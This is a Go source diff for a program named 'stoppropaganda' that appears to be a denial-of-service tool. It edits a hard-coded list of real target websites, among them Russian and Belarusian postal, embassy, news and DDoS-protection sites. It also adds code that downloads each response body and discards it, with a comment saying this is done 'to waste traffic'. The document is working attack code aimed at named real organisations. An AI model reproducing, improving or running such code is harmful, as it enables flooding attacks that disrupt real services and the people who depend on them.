@@ -1,6 +1,7 @@
 package stoppropaganda
 
 import (
+	"io"
 	"net/url"
 	"strings"
 	"sync"
@@ -129,8 +130,8 @@ var targetWebsites = map[string]struct{}{
 	"http://pochta.ru":             {},
 	"http://crimea-post.ru":        {},
 
-        // Embassy
-	"https://montreal.mid.ru":      {},
+	// Embassy
+	"https://montreal.mid.ru": {},
 
 	// Others
 	"https://109.207.1.118":          {},
@@ -266,9 +267,9 @@ var targetWebsites = map[string]struct{}{
 	"https://minsknews.by":      {},
 	"https://zarya.by":          {},
 	"https://grodnonews.by":     {},
-	
+
 	/* DDOS mitigation */
-        "https://ddos-guard.net/ru": {},
+	"https://ddos-guard.net/ru": {},
 	"https://stormwall.pro":     {},
 	"https://qrator.net/ru":     {},
 	"https://solidwall.ru":      {},
@@ -392,6 +393,14 @@ func (ws *Website) Start(endpoint string) {
 				ws.Counter_code500++
 			}
 			ws.mux.Unlock()
+
+			// Download content, to waste traffic
+			if err = resp.BodyWriteTo(io.Discard); err != nil {
+				ws.mux.Lock()
+				ws.Errors++
+				ws.LastErrorMsg = err.Error()
+				ws.mux.Unlock()
+			}
 		}
 	}
 
